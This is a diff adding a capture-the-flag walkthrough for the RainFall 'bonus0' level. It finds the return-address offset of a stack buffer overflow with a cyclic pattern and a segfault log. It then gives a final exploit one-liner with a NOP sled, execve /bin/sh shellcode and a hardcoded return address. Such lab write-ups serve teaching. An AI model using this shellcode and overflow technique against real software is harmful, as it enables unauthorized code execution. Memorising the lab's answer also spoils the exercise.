@@ -1,6 +1,38 @@
 # bonus0
 
+there's a read function in p that read 4096 byte into 4104 byte size buffer.
+
+so using pattern to check for eip offset on the second arguments
+
+```sh
+bonus0@RainFall:~$ (python -c "print 'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag'"; python -c "print 'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag'") | ./bonus0
+ - 
+ - 
+Aa0Aa1Aa2Aa3Aa4Aa5AaAa0Aa1Aa2Aa3Aa4Aa5Aa��� Aa0Aa1Aa2Aa3Aa4Aa5Aa���
+Segmentation fault (core dumped)
+```
+
+we got 9
+
+```sh
+[...]
+[14463.475436] bonus0[6054]: segfault at 41336141 ip 41336141 sp bffff770 error 14
+```
+
+so the buffer should look like this
+
+```sh
+[20 btyes NOP] + [20 bytes NOP] + | [space] + [address of NOP ] + [filler] | + [NOP] + [shell code]
+```
+
+to create the payload argv[1] will contain the NOP enough to escape both buffer in `pp()` and some space for the NOP sledge zone and end with shell code.
+
+then in argv[2] iw should contain 20 bytes with 9 bytes of anything to the eip then the address to the NOP zone and fill the rest of 20 bytes or more with anything ( prefeable NOP or A ) 
+
+the final payload is this, and also keep the pipe open with cat
 
 ```sh
 (python -c "print '\x90' * 90 + '\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80'"; python -c "print '\x90' * 9 + '\xd0\xe6\xff\xbf' + 'A'* 8"; cat) | ./bonus0
 ```
+
+and we get the shell.
